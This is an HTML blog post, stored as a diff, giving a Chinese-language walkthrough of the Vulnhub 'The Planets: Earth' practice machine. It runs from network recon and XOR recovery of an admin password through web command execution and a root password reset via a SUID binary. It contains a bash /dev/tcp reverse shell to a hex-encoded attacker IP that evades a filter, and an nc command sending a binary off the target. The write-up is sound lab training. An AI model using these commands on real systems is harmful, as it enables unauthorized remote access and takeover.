@@ -1,0 +1,175 @@
+<!doctype html><html lang=zh-cn itemscope itemtype=http://schema.org/WebPage><head><meta name=generator content="Hugo 0.121.2"><meta charset=utf-8><title>靶机：THE PLANETS EARTH · echo</title>
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=description content="一、外网信息收集 1 靶机概述 1.1 下载地址 https://www.vulnhub.com/entry/the-planets-earth,755/ 1.2 靶机描述 Description [Back to the Top](https://www.vulnhub.com/entry/the-planets-earth,755/#top) Difficulty: Easy Earth is an easy box though you will likely find it more challenging than &amp;#34;Mercury&amp;#34; in this series and on the harder side of easy, depending on your experience. There are two flags on the box: a user and"><meta name=keywords content="Hugo,Photography,Computer"><link rel=canonical href=https://www.inecho.cc/zh-cn/2024/02/19/%E9%9D%B6%E6%9C%BAthe-planets-earth/><link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css integrity=sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.2.0/css/all.css integrity=sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ crossorigin=anonymous><link rel=stylesheet href=https://www.inecho.cc/css/den.css></head><body><div class=header-container style=background:linear-gradient(rgba(0,0,0,.2),rgba(0,0,0,.2)),url(https://www.inecho.cc/images/background.jpg);background-position:50%;background-size:cover><div class=container><nav class="header-nav navbar navbar-expand-md navbar-dark light-dark"><div class="header-logo navbar-brand"><a class=float-left href=https://www.inecho.cc/zh-cn/><img class="mr20 header-logo-image" src=https://www.inecho.cc/images/globe.svg alt=logo>
+echo</a></div><button class=navbar-toggler type=button data-toggle=collapse data-target=#navbarNav aria-controls=navbarNav aria-expanded=false aria-label="Toggle navigation">
+<span class=navbar-toggler-icon></span></button><div class="nav-menu collapse navbar-collapse" id=navbarNav><ul class=navbar-nav><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/category/ideas/>思考</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/category/photography/>摄影</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/category/computer/>计算机</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/about/>关于</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/en/><i class="fas fa-globe"></i> English</a></li></ul></div></nav></div><div class="container header-wrapper"><div class=row><div class=col-lg-12><div class=header-content><h1 class=header-title>靶机：THE PLANETS EARTH</h1><p class=header-date>作者：
+Jack /
+2024-02-19
+/ 分类：
+<a href=https://www.inecho.cc/zh-cn/category/computer/>computer</a></p><div class=header-underline></div><div class=clearfix></div><p class="float-right header-tags"><i class="fas fa-tags" aria-hidden=true></i>
+<a href=https://www.inecho.cc/zh-cn/tag/vulnhub/>Vulnhub</a></p></div></div></div></div></div><main><div class="container content"><article><h2 id=一外网信息收集>一、外网信息收集</h2><h3 id=1-靶机概述>1 靶机概述</h3><h4 id=11-下载地址>1.1 下载地址</h4><p><a href=https://www.vulnhub.com/entry/the-planets-earth,755/>https://www.vulnhub.com/entry/the-planets-earth,755/</a></p><h4 id=12-靶机描述>1.2 靶机描述</h4><pre tabindex=0><code>Description
+
+[Back to the Top](https://www.vulnhub.com/entry/the-planets-earth,755/#top)
+
+Difficulty: Easy
+
+Earth is an easy box though you will likely find it more challenging than &#34;Mercury&#34; in this series and on the harder side of easy, depending on your experience. There are two flags on the box: a user and root flag which include an md5 hash. This has been tested on VirtualBox so may not work correctly on VMware. Any questions/issues or feedback please email me at: SirFlash at protonmail.com, though it may take a while for me to get back to you.
+</code></pre><h3 id=2-靶机信息>2 靶机信息</h3><h4 id=21-靶机界面>2.1 靶机界面</h4><p><img src=img/20240205185128.png alt=image.png></p><h4 id=22-网络信息>2.2 网络信息</h4><table><thead><tr><th>IP地址</th><th>MAC地址</th></tr></thead><tbody><tr><td>192.168.1.20</td><td></td></tr></tbody></table><h2 id=二主动信息收集>二、主动信息收集</h2><h3 id=1-主机发现>1 主机发现</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# arp-scan --interface eth0 192.168.1.0/24
+</span></span><span class=line><span class=cl>Interface: eth0, type: EN10MB, MAC: 00:0c:29:0a:50:19, IPv4: 192.168.1.21
+</span></span><span class=line><span class=cl>Starting arp-scan 1.10.0 with <span class=m>256</span> hosts <span class=o>(</span>https://github.com/royhills/arp-scan<span class=o>)</span>
+</span></span><span class=line><span class=cl>192.168.1.1     c0:fd:84:1b:81:ec       zte corporation
+</span></span><span class=line><span class=cl>192.168.1.3     ec:60:73:08:57:14       TP-LINK TECHNOLOGIES CO.,LTD.
+</span></span><span class=line><span class=cl>192.168.1.4     a4:39:b3:ac:7f:03       Beijing Xiaomi Mobile Software Co., Ltd
+</span></span><span class=line><span class=cl>192.168.1.16    e0:d4:e8:a0:76:e8       Intel Corporate
+</span></span><span class=line><span class=cl>192.168.1.19    08:ed:b9:86:da:0f       Hon Hai Precision Ind. Co.,Ltd.
+</span></span><span class=line><span class=cl>192.168.1.20    08:ed:b9:86:da:0f       Hon Hai Precision Ind. Co.,Ltd.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>6</span> packets received by filter, <span class=m>0</span> packets dropped by kernel
+</span></span><span class=line><span class=cl>Ending arp-scan 1.10.0: <span class=m>256</span> hosts scanned in 1.999 seconds <span class=o>(</span>128.06 hosts/sec<span class=o>)</span>. <span class=m>6</span> responded
+</span></span></code></pre></div><p>确认靶机为 192.168.1.20 08:ed:b9:86:da:0f Hon Hai Precision Ind. Co.,Ltd.</p><h3 id=2-端口扫描>2 端口扫描</h3><h4 id=21-nmap-扫描>2.1 nmap 扫描</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# nmap -A -p- -sC -T4 192.168.1.20
+</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-02-05 18:56 CST
+</span></span><span class=line><span class=cl>Stats: 0:02:29 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing Service Scan
+</span></span><span class=line><span class=cl>Service scan Timing: About 66.67% <span class=k>done</span><span class=p>;</span> ETC: 18:58 <span class=o>(</span>0:00:06 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.1.20 <span class=o>(</span>192.168.1.20<span class=o>)</span>
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.0035s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65390</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>, <span class=m>142</span> filtered tcp ports <span class=o>(</span>admin-prohibited<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT    STATE SERVICE  VERSION
+</span></span><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH 8.6 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp  open  http     Apache httpd 2.4.51 <span class=o>((</span>Fedora<span class=o>)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.51 <span class=o>(</span>Fedora<span class=o>)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Bad Request <span class=o>(</span>400<span class=o>)</span>
+</span></span><span class=line><span class=cl>443/tcp open  ssl/http Apache httpd 2.4.51 <span class=o>((</span>Fedora<span class=o>)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.51 <span class=o>(</span>Fedora<span class=o>)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>earth.local/stateOrProvinceName<span class=o>=</span>Space
+</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
+</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-10-12T23:26:31
+</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2031-10-10T23:26:31
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Bad Request <span class=o>(</span>400<span class=o>)</span>
+</span></span><span class=line><span class=cl>MAC Address: 08:ED:B9:86:DA:0F <span class=o>(</span>Hon Hai Precision Ind.<span class=o>)</span>
+</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
+</span></span><span class=line><span class=cl>Device type: general purpose<span class=p>|</span>storage-misc
+</span></span><span class=line><span class=cl>Running <span class=o>(</span>JUST GUESSING<span class=o>)</span>: Linux 4.X<span class=p>|</span>5.X<span class=p>|</span>2.6.X<span class=p>|</span>3.X <span class=o>(</span>97%<span class=o>)</span>, Synology DiskStation Manager 5.X <span class=o>(</span>90%<span class=o>)</span>, Netgear RAIDiator 4.X <span class=o>(</span>87%<span class=o>)</span>
+</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28
+</span></span><span class=line><span class=cl>Aggressive OS guesses: Linux 4.15 - 5.8 <span class=o>(</span>97%<span class=o>)</span>, Linux 5.0 - 5.4 <span class=o>(</span>97%<span class=o>)</span>, Linux 5.0 - 5.5 <span class=o>(</span>95%<span class=o>)</span>, Linux 2.6.32 <span class=o>(</span>91%<span class=o>)</span>, Linux 3.10 - 4.11 <span class=o>(</span>91%<span class=o>)</span>, Linux 3.2 - 4.9 <span class=o>(</span>91%<span class=o>)</span>, Linux 3.4 - 3.10 <span class=o>(</span>91%<span class=o>)</span>, Linux 5.1 <span class=o>(</span>91%<span class=o>)</span>, Linux 2.6.32 - 3.10 <span class=o>(</span>91%<span class=o>)</span>, Linux 2.6.32 - 3.13 <span class=o>(</span>91%<span class=o>)</span>
+</span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span><span class=nb>test</span> conditions non-ideal<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TRACEROUTE
+</span></span><span class=line><span class=cl>HOP RTT     ADDRESS
+</span></span><span class=line><span class=cl><span class=m>1</span>   3.53 ms 192.168.1.20 <span class=o>(</span>192.168.1.20<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 161.50 seconds
+</span></span></code></pre></div><h4 id=22-信息总结>2.2 信息总结</h4><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 8.6 (protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</td></tr><tr><td>443/tcp</td><td>open</td><td>ssl/http</td><td>Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</td></tr></tbody></table><p>发现 443 端口存在 DNS 解析</p><p><img src=img/20240205192029.png alt=image.png></p><p>在 Hosts 文件中添加 DNS 解析</p><p><img src=img/20240205192525.png alt=image.png></p><h3 id=3-网站信息>3 网站信息</h3><h4 id=31-网站首页>3.1 网站首页</h4><p><img src=img/20240205192840.png alt=image.png></p><p>在网站底部发现 <strong>Previous Messages</strong></p><pre tabindex=0><code>37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
+
+3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
+
+2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a
+</code></pre><h4 id=32-隐藏目录扫描>3.2 隐藏目录扫描</h4><h5 id=对-httpearthlocal-扫描>对 <a href=http://earth.local>http://earth.local</a> 扫描</h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# dirb https://earth.local         
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>DIRB v2.22    
+</span></span><span class=line><span class=cl>By The Dark Raver
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>START_TIME: Wed Feb  <span class=m>7</span> 11:23:43 <span class=m>2024</span>
+</span></span><span class=line><span class=cl>URL_BASE: https://earth.local/
+</span></span><span class=line><span class=cl>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>GENERATED WORDS: <span class=m>4612</span>                                                          
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>---- Scanning URL: https://earth.local/ ----
+</span></span><span class=line><span class=cl>+ https://earth.local/admin <span class=o>(</span>CODE:301<span class=p>|</span>SIZE:0<span class=o>)</span>
+</span></span><span class=line><span class=cl>+ https://earth.local/cgi-bin/ <span class=o>(</span>CODE:403<span class=p>|</span>SIZE:199<span class=o>)</span>
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>END_TIME: Wed Feb  <span class=m>7</span> 11:24:58 <span class=m>2024</span>
+</span></span><span class=line><span class=cl>DOWNLOADED: <span class=m>4612</span> - FOUND: <span class=m>2</span>
+</span></span></code></pre></div><p><a href=http://earth.local/admin>http://earth.local/admin</a> ，发现是个登录页面，但是目前没有账号和密码</p><p><img src=img/20240207110544.png alt=image.png></p><h5 id=对-httpterratestearthlocal-扫描>对 <a href=http://terratest.earth.local>http://terratest.earth.local</a> 扫描</h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# dirb https://terratest.earth.local
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>DIRB v2.22    
+</span></span><span class=line><span class=cl>By The Dark Raver
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>START_TIME: Wed Feb  <span class=m>7</span> 11:26:14 <span class=m>2024</span>
+</span></span><span class=line><span class=cl>URL_BASE: https://terratest.earth.local/
+</span></span><span class=line><span class=cl>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>GENERATED WORDS: <span class=m>4612</span>                                                          
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>---- Scanning URL: https://terratest.earth.local/ ----
+</span></span><span class=line><span class=cl>+ https://terratest.earth.local/cgi-bin/ <span class=o>(</span>CODE:403<span class=p>|</span>SIZE:199<span class=o>)</span>
+</span></span><span class=line><span class=cl>+ https://terratest.earth.local/index.html <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:26<span class=o>)</span>
+</span></span><span class=line><span class=cl>+ https://terratest.earth.local/robots.txt <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:521<span class=o>)</span>
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>END_TIME: Wed Feb  <span class=m>7</span> 11:26:52 <span class=m>2024</span>
+</span></span><span class=line><span class=cl>DOWNLOADED: <span class=m>4612</span> - FOUND: <span class=m>3</span>
+</span></span></code></pre></div><p><a href=https://terratest.earth.local/robots.txt>https://terratest.earth.local/robots.txt</a> 该 URL 网页中发现 /testingnotes.*</p><p><img src=img/20240207113329.png alt=image.png></p><p>尝试访问 /testingnotes.* 但是不知道后缀名是什么，手动尝试出来是 .txt 后缀</p><p><img src=img/20240207114234.png alt=image.png></p><p>访问后发现一段有用的信息，翻译出来如下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>测试安全消息系统注意事项：
+</span></span><span class=line><span class=cl>* 使用XOR加密作为算法，应该安全，因为RSA中使用了它。
+</span></span><span class=line><span class=cl>* 地球已确认他们已收到我们发送的消息。
+</span></span><span class=line><span class=cl>* 使用 testdata.txt 进行加密测试。
+</span></span><span class=line><span class=cl>* terra 用作管理员门户的用户名。
+</span></span><span class=line><span class=cl>待办事项：
+</span></span><span class=line><span class=cl>* 我们如何安全地向地球发送我们的月度密钥？还是应该每周更换密钥？
+</span></span><span class=line><span class=cl>* 需要测试不同长度的密钥以防止暴力破解。密钥应该多长？
+</span></span><span class=line><span class=cl>* 需要改进消息界面和管理员面板的界面，目前非常基础。
+</span></span></code></pre></div><p>得到有用的信息。该靶机使用的加密算法是 XOR 异或加密，使用 testdata.txt 测试过加密，terra 是登录用户名，访问testdata.txt看一下。翻译之后也没发现什么有用信息，看来只是一个加密测试文件了，先将其另存为下载下来。</p><p><img src=img/20240207120142.png alt=image.png></p><p>因为 testdata.txt 曾经用于测试加密，且根据推断在 earth.local 首页的 Previous Messages 中的数据很有可能就是 testdata.txt 加密后的信息。所以，我们可以使用这两个信息点通过 XOR 解密，尝试得到加密密钥。</p><p>使用网站 <a href=https://gchq.github.io/CyberChef/>https://gchq.github.io/CyberChef/</a> 可以解出3段密码，也可以写脚本，这里我用的是网站。先将 Previous message 从 16 进制数转化为 UTF-8 ，再与 Message 进行 XOR 运算，message 就是 testdata.txt 的内容，XOR 运算也使用 UTF-8 编码 把 testdata.txt 的内容写到 XOR 的 Key 中，第三段解出了需要的东西，查看发现是重复的内容，可能是登陆密码。</p><p><img src=img/20240219195620.png alt=image.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>earthclimatechangebad4humans
+</span></span></code></pre></div><h2 id=三攻击>三、攻击</h2><h3 id=1-网站登录>1 网站登录</h3><p>根据之前的信息收集和密码破解，我们得到用户名和密码，尝试登录之前扫描到的 <a href=http://earth.local/admin/>http://earth.local/admin/</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>用户名：terra
+</span></span><span class=line><span class=cl>密  码：earthclimatechangebad4humans
+</span></span></code></pre></div><p><img src=img/20240219200407.png alt=image.png></p><p>登录成功</p><p><img src=img/20240219200427.png alt=image.png></p><h3 id=2-漏洞利用>2 漏洞利用</h3><p>登录后，发现可以在当前窗口执行一些系统命令</p><p><img src=img/20240219200802.png alt=image.png></p><p>先使用 Find 命令查找一下 flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>find / -name <span class=s2>&#34;*flag.txt&#34;</span>
+</span></span></code></pre></div><p><img src=img/20240219201500.png alt=image.png></p><p>cat 命令查看一下</p><p><img src=img/20240219201540.png alt=image.png></p><h3 id=3-反弹shell>3 反弹shell</h3><p>这里使用反弹 shell 需要将 IP 转换成 16 进制进行绕过</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bash -i &gt;<span class=p>&amp;</span> /dev/tcp/0x0a.0x04.0x07.0x84/8888 0&gt;<span class=p>&amp;</span><span class=m>1</span>
+</span></span></code></pre></div><p><img src=img/20240219202351.png alt=image.png></p><p>连接成功</p><h2 id=四提权>四、提权</h2><p>使用 find 命令查找具有 root 权限的命令</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bash-5.1$ find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
+</span></span><span class=line><span class=cl>find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/usr/bin/chage
+</span></span><span class=line><span class=cl>/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/usr/bin/su
+</span></span><span class=line><span class=cl>/usr/bin/mount
+</span></span><span class=line><span class=cl>/usr/bin/umount
+</span></span><span class=line><span class=cl>/usr/bin/pkexec
+</span></span><span class=line><span class=cl>/usr/bin/passwd
+</span></span><span class=line><span class=cl>/usr/bin/chfn
+</span></span><span class=line><span class=cl>/usr/bin/chsh
+</span></span><span class=line><span class=cl>/usr/bin/at
+</span></span><span class=line><span class=cl>/usr/bin/sudo
+</span></span><span class=line><span class=cl>/usr/bin/reset_root
+</span></span><span class=line><span class=cl>/usr/sbin/grub2-set-bootflag
+</span></span><span class=line><span class=cl>/usr/sbin/pam_timestamp_check
+</span></span><span class=line><span class=cl>/usr/sbin/unix_chkpwd
+</span></span><span class=line><span class=cl>/usr/sbin/mount.nfs
+</span></span><span class=line><span class=cl>/usr/lib/polkit-1/polkit-agent-helper-1
+</span></span><span class=line><span class=cl>bash-5.1$ 
+</span></span></code></pre></div><p>找到一个 /usr/bin/reset_root 文件，使用 strings 命令查看一下</p><p><img src=img/20240219205315.png alt=image.png></p><p>图中高亮的这条信息：大概意思是修改root密码为Earth</p><p>运行 reset_root 提示没有触发器</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bash-5.1$ reset_root
+</span></span><span class=line><span class=cl>reset_root
+</span></span><span class=line><span class=cl>CHECKING IF RESET TRIGGERS PRESENT...
+</span></span><span class=line><span class=cl>RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
+</span></span><span class=line><span class=cl>bash-5.1$ 
+</span></span></code></pre></div><p>使用 nc 传送到 kali 中进行调试分析，</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1>#先在 kali 攻击机上监听 4444 端口，并将接收到的内容重定向到文件 reset_root</span>
+</span></span><span class=line><span class=cl>nc -lvvp <span class=m>4444</span> &gt; reset_root
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#在靶机上将/usr/bin/reset_root文件的内容通过nc重定向到攻击机的2222端口</span>
+</span></span><span class=line><span class=cl>bash-5.1$ nc 10.4.7.132 <span class=m>4444</span> &lt; /usr/bin/reset_root
+</span></span></code></pre></div><p>使用 <strong>strace</strong> 命令进行调试</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>strace /root/reset_root
+</span></span></code></pre></div><p><img src=img/20240219213225.png alt=image.png></p><p>因为没有以下三个文件而报错，查看靶机发现也没有这三个文件：</p><pre tabindex=0><code>access(&#34;/dev/shm/kHgTFI5G&#34;, F_OK)       = -1 ENOENT (No such file or directory)
+access(&#34;/dev/shm/Zw7bV9U5&#34;, F_OK)       = -1 ENOENT (No such file or directory)
+access(&#34;/tmp/kcM0Wewe&#34;, F_OK)           = -1 ENOENT (No such file or directory)
+</code></pre><p>在靶机中创建这三个文件</p><pre tabindex=0><code>touch /dev/shm/kHgTFI5G
+touch /dev/shm/Zw7bV9U5
+touch /tmp/kcM0Wewe
+</code></pre><p>创建成功后再次运行 reset_root 文件</p><p><img src=img/20240219214058.png alt=image.png></p><p>运行成功，成功将密码修改成 Earth，提权成功！</p><p>查找 root flag</p><p><img src=img/20240219214209.png alt=image.png></p></article><div class=author-card><div class=underline></div><div class=author-box><div class=author-image><a href=/zh-cn><img src=/images/avatar.jpg alt=Jack></a></div><div class=author-content><p class=author-title>作者</p><p class=author-name>Jack</p><p class=author-desc>网络安全从业者，不知名三分熟摄影师。喜欢探索新领域，对摄影、电影和运动有极大兴趣，平时喜欢折腾一些无用但又有趣的东西。</p></div></div></div></div></main><div class="footer gradient-2"><div class="container footer-container"><div class=row><div class="col-xs-4 col-sm-3 col-md-3 col-lg-3"><div class=footer-title>网站地图</div><ul class=list-unstyled><li><a href=https://www.inecho.cc/zh-cn/tags/>标签</a></li><li><a href=https://www.inecho.cc/zh-cn/categories/>分类</a></li><li><a rel=alternate type=application/rss+xml href=https://www.inecho.cc/zh-cn/index.xml><i class="fas fa-rss-square"></i> RSS 订阅</a></li></ul></div><div class="col-xs-4 col-sm-3 col-md-3 col-lg-3"><div class=footer-title>社群</div><ul class=list-unstyled><li><a href=https://github.com/shaform/hugo-theme-den/ rel=noopener target=_blank>GitHub</a></li></ul></div><div class="col-xs-4 col-sm-3 col-md-3 col-lg-3"><div class=footer-title>连结</div><ul class=list-unstyled><li><a href=https://www.princesses.cc/ rel=noopener target=_blank>Princesses</a></li></ul></div><div class="col-xs-12 col-sm-3 col-md-3 col-lg-3"><p class="pull-right text-right"><small><em>Proudly powered by <a href=https://gohugo.io/ rel=noopener target=_blank>Hugo</a></em></small><br><small><em>Theme - <a href=https://github.com/shaform/hugo-theme-den rel=noopener target=_blank>Den</a></em></small><br><small>&copy;
+Jack
+2024</small></p></div></div></div></div><script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js integrity=sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49 crossorigin=anonymous></script><script src=https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js integrity=sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy crossorigin=anonymous></script></body></html>
